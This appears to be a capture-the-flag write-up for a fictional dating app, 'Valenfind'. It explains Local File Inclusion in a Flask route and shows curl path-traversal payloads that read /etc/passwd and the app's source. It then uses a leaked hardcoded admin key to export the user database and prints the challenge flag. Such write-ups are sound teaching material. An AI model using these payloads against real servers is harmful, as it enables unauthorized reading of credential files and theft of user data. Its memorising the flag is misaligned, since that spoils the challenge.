# 💖 Valenfind Challenge – “Vibe-Coded Dating App”

## 📝 Challenge Overview

**Valenfind** is a fictional dating application intentionally designed with a hidden vulnerability.  
Your mission is to identify and extract the **flag** hidden within the system.  

The app is accessible at:  
```
[http://10.49.158.106:5000](http://10.49.158.106:5000)  
```
---

## 🔍 Understanding the Vulnerability

### 1. What is LFI (Local File Inclusion)?

**Local File Inclusion (LFI)** is a web security flaw that allows an attacker to include and read files on a server through a web application.  
It usually occurs when a web app **directly uses user input to access files** without proper validation.  

**Why LFI is dangerous:**
- Can expose sensitive files like `/etc/passwd` or configuration files.  
- May reveal source code, API keys, or passwords.  
- Can lead to full server compromise when chained with other vulnerabilities.  

**Example in this app:**

```python
@app.route('/api/fetch_layout')
def fetch_layout():
    layout_file = request.args.get('layout', 'theme_classic.html')
    file_path = os.path.join(os.getcwd(), 'templates', 'components', layout_file)
    with open(file_path, 'r') as f:
        return f.read()
```
Here, the layout parameter is directly used to access files, without sanitization → allows reading arbitrary files on the system.

2. Python Server Vulnerabilities
The Flask server contains multiple security issues:

Hardcoded secrets:

ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
Hardcoding API keys is dangerous because once discovered, attackers can access privileged endpoints.

Unrestricted file read via LFI:
The /api/fetch_layout route allows reading files outside the intended templates folder.

Database exposure endpoint:
```
@app.route('/api/admin/export_db')
With the admin key, anyone could download the full SQLite database containing user credentials and the flag.
```
🛠 Step-by-Step Solution
Step 1: Test for LFI
Fetch a system file to confirm vulnerability:
```
curl "http://10.49.158.106:5000/api/fetch_layout?layout=../../../../etc/passwd"

```
✅ Expected output:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin/nologin
...
This confirms LFI is present.

Step 2: Fetch Application Source Code
```
curl "http://10.49.158.106:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py"
From the code, you can find:

ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"

Database path: cupid.db

Admin export endpoint: /api/admin/export_db
```
Step 3: Export the Database
Use the admin key to download the database:
```
curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
"http://10.49.158.106:5000/api/admin/export_db" -o valenfind.db
```
Step 4: Inspect the Database
Open the database using SQLite:

sqlite3 valenfind.db
Check tables:

.tables
Query the users table:

select * from users;
Step 5: Locate the Flag
The flag is stored in the address field of the admin user (cupid):

FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
✅ That’s the final flag.

⚡ Lessons Learned
Never trust user input – always sanitize file paths to prevent LFI.

Do not hardcode secrets – store keys securely outside source code.

Secure admin endpoints – require authentication and limit access.

Database safety – avoid exposing databases directly to the public.

Audit code for dynamic file access – open() or template loading can be exploited.

🏁 Conclusion
This challenge demonstrates:

The power of Local File Inclusion (LFI).

The dangers of exposing admin API keys.

How sensitive information can be leaked through poor server design.

Flag:
```
THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
```
---

